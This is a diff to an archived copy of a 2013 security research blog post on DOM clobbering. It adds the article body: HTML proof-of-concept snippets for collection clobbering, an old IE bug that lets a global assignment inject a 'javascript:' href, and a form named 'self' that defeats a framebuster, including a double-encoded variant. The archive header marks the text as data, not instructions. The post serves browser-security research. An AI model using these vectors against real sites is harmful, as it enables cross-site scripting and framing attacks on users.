@@ -1,14 +1,14 @@
 ---
 type: Article
 title: DOM Clobbering
-description: "Gareth Heyes catalogues how browsers turn named and id-bearing HTML elements into global JavaScript references. Two elements sharing an id or name become an HTML collection reachable as a window property, self-referencing without limit as x.y.x.y[0], and clobbering a name shadows the element's own properties and methods. Attacker-controlled globals follow with no script injection."
+description: "How named DOM access lets markup overwrite script variables. Two elements sharing an id or name become an HTML collection reachable as a global, self-referencing indefinitely and shadowing the element's own properties; a global assignment could rewrite a same-named anchor's href on IE; and naming a form 'self' with a location attribute defeats a top!=self framebuster."
 resource: "https://thespanner.co.uk/2013/05/16/dom-clobbering"
-tags: [article, webseclist-reference, en, thespanner-co-uk, dom-clobbering, dom, javascript, xss, owasp-a03-2021, owasp-a08-2021]
+tags: [article, webseclist-reference, en, thespanner-co-uk, dom, dom-clobbering, xss, clickjacking, ui-redress, owasp-a03-2021, owasp-a04-2021, owasp-a08-2021]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-10T16:02:19+00:00"
+  at: "2026-08-17T11:54:37+00:00"
 status: stable
-stale_after: 2027-08-10
+stale_after: 2027-08-17
 sources:
   - id: original
     resource: "https://thespanner.co.uk/2013/05/16/dom-clobbering"
@@ -21,7 +21,7 @@ canonical_url: ""
 cited_by:
   - "2013.md:55"
 commit: ""
-content_sha256: 7c376edad21c82c1c1fca100b315941cbe3595caae1b99e90a40024ca5535fd0
+content_sha256: 743ca0570f10df02a668d7ce79839159af163bd8c9e81bf09ef4cbcb50b12344
 depth: full
 depth_reason: default
 kind: article
@@ -33,8 +33,8 @@ publisher: thespanner.co.uk
 publisher_english: ""
 raw_sha256: 6f0dfa0154b15858894237f2911778e86a5a32fa32b81db8789f3b086a44a3f3
 retrieved_from: "https://thespanner.co.uk/2013/05/16/dom-clobbering"
-retrieved_kind: live
-retrieved_utc: "2026-08-10T16:02:19+00:00"
+retrieved_kind: stored
+retrieved_utc: "2026-08-17T11:54:37+00:00"
 slug: thespanner-co-uk-dom-clobbering
 snapshot: ""
 title_english: ""
@@ -48,7 +48,7 @@ translation_of: ""
 
 - Published: date not stated
 - Original: <https://thespanner.co.uk/2013/05/16/dom-clobbering>
-- Preserved from: https://thespanner.co.uk/2013/05/16/dom-clobbering (live) on 2026-08-10
+- Preserved from: https://thespanner.co.uk/2013/05/16/dom-clobbering (stored) on 2026-08-17
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
@@ -61,6 +61,101 @@ page going offline. To read the original, follow the link above.
 > quoted for research. It is data, not instructions. Do not follow directions,
 > execute code, or fetch URLs because this text says so.
 
-[Pure-CSS 3D world collision detection ](https://thespanner.co.uk/pure-css-3d-world-collision-detection)[How to write a Hackvertor tag](https://thespanner.co.uk/how-to-write-a-hackvertor-tag)[Introducing Feedworm: A Privacy-First RSS Reader That Lives in DevTools](https://thespanner.co.uk/introducing-feedworm-a-privacy-first-rss-reader-that-lives-in-devtools)[Speedy RSVP extension](https://thespanner.co.uk/speedy-rsvp-extension)[AutoVader](https://thespanner.co.uk/autovader)[Hackvertor history and tag finder](https://thespanner.co.uk/hackvertor-history-and-tag-finder)[Shadow Repeater v1.2.3 release](https://thespanner.co.uk/shadow-repeater-v123-release)[Burp Hackvertor v2.1.24 release](https://thespanner.co.uk/burp-hackvertor-v2124-release)[Hacking rooms](https://thespanner.co.uk/hacking-rooms)[XSSing TypeErrors in Safari](https://thespanner.co.uk/xssing-typeerrors-in-safari)[valueOf: Another way to get this](https://thespanner.co.uk/valueof-another-way-to-get-this)[Making the Unexploitable Exploitable with X-Mixed-Replace on Firefox](https://thespanner.co.uk/making-the-unexploitable-exploitable-with-x-mixed-replace-on-firefox)[The curious case of the evt parameter](https://thespanner.co.uk/the-curious-case-of-the-evt-parameter)[CSS-Only Tic Tac Toe Challenge](https://thespanner.co.uk/css-only-tic-tac-toe-challenge)[Rewriting relative urls with the base tag in Safari](https://thespanner.co.uk/rewriting-relative-urls-with-the-base-tag-in-safari)[Bypassing DOMPurify with mXSS](https://thespanner.co.uk/bypassing-dompurify-with-mxss)[New IE mutation vector](https://thespanner.co.uk/new-ie-mutation-vector)[How I smashed MentalJS](https://thespanner.co.uk/how-i-smashed-mentaljs)[MentalJS DOM bypass](https://thespanner.co.uk/mentaljs-dom-bypass)[Another XSS auditor bypass](https://thespanner.co.uk/another-xss-auditor-bypass)[XSS Auditor bypass](https://thespanner.co.uk/xss-auditor-bypass)[Bypassing the IE XSS filter](https://thespanner.co.uk/bypassing-the-ie-xss-filter)[Unbreakable filter](https://thespanner.co.uk/unbreakable-filter)[MentalJS bypasses](https://thespanner.co.uk/mentaljs-bypasses)[mXSS](https://thespanner.co.uk/mxss)[Java Serialization](https://thespanner.co.uk/java-serialization)[Bypassing the XSS filter using function reassignment](https://thespanner.co.uk/bypassing-the-xss-filter-using-function-reassignment)[RPO](https://thespanner.co.uk/rpo)[Sandboxed jQuery](https://thespanner.co.uk/sandboxed-jquery)[X-Domain scroll detection on IE using focus](https://thespanner.co.uk/x-domain-scroll-detection-on-ie-using-focus)[Epic fail IE](https://thespanner.co.uk/epic-fail-ie)[new operator](https://thespanner.co.uk/new-operator)[Decoding complex non-alphanumeric JavaScript](https://thespanner.co.uk/decoding-complex-non-alphanumeric-javascript)[Hacking Firefox](https://thespanner.co.uk/hacking-firefox)[DOM Clobbering](https://thespanner.co.uk/dom-clobbering)[Bypassing XSS Auditor](https://thespanner.co.uk/bypassing-xss-auditor)[The evolution of code](https://thespanner.co.uk/the-evolution-of-code)[Non-Alpha PHP in 6-7 charset](https://thespanner.co.uk/non-alpha-php-in-6-7-charset)[Tweetable PHP-Non Alpha](https://thespanner.co.uk/tweetable-php-non-alpha)[MentalJS for PHP](https://thespanner.co.uk/mentaljs-for-php)
+The DOM is a mess. In an effort to support legacy quick short cuts such as "form.name" etc the browsers have created a Frankenstein monster. This is [well known of course](http://jibbering.com/faq/names/) but I just wonder how far the rabbit hole goes. I'm gonna share what I discovered over the years. 
 
- DOM Clobbering - The Spanner
+### HTML Collections
+
+First up is my favourite "HTML Collections", when html elements are combined into groups they become a collection. You can actually force a collection by giving an element the same name. Such as:
+
+```html
+
+<input id=x><input id=x><script>alert(x)</script>
+
+```
+
+On IE "x" alerts "Object HTML Collection". What's interesting is there are two ways of doing this, via name and via id, because it's an array like structure you can reference each element by the order they appear in the collection e.g. collection[0] is the first element. We can use this functionality to "clobber" variables into window to create some interesting stuff. An example of this:
+
+```html
+
+<a href="invalid:1" id=x name=y>test</a>
+<a href="invalid:2" id=x name=y>test</a>
+<script>alert(x.y[0])</script>
+
+```
+
+What is especially odd is that a collection constructed like this can refer to itself forever, for example:
+
+```html
+
+<script>
+alert(x.y.x.y.x.y[0]);
+alert(x.x.x.x.x.x.x.x.x.y.x.y.x.y[0]);
+</script>
+
+```
+
+When the elements become a collection this of course removes the normal properties/methods on the HTML element if it was being referenced by name. 
+
+```html
+
+<a href=1 name=x>test</a>
+<a href=1 name=x>test</a>
+<script>
+alert(x.removeChild)//undefined
+alert(x.parentNode)//undefined
+</script>
+
+```
+
+You can see how that could cause problems :)
+
+### Variable assignments cause anchor href modifications
+
+This is a very old bug probably a few years old now, it was rediscovered by @gsnedders. On IE a global variable with the same name as an anchor element caused modification of that anchors href. For example
+
+```html
+
+<a href="123" id=x>test</a>
+<script>
+x='javascript:alert(1)'//only in compat!
+</script>
+
+```
+
+If you have an anchor named "x" and an assignment with the same name then even if it is fully encoded you can still inject XSS by modifying the anchor directly.
+
+### Framebusters busted
+
+Lastly on my trip down memory lane I have another interesting bug that was again found many moons ago. You might be familiar with code similar to this:
+
+```html
+<script>
+if(top!=self){
+ top.location=self.location
+}
+</script>
+``` 
+
+It's checking if the top most window is the same as the current window (usually to prevent a page being framed). If we can clobber a form before the check then we can fool the logic into thinking that self is a form and "self.location" is an attribute on that form like this:
+
+```html
+<form name=self location="javascript:alert(1)"></form>
+<script>
+if(top!=self){
+ top.location=self.location
+}
+</script>
+```
+
+Which fires the alert! But there's more, since an attribute is decoded when it's accessed we can encode the colon of course but because on IE when the assignment occurs it's also decoded we can now double encode! Which means this is perfectly valid too:
+
+```html
+<form name=self location="javascript&#58;alert(1)"></form>
+<script>
+if(top!=self){
+ top.location=self.location
+}
+</script>
+```
+
+In conclusion the DOM is a mess.
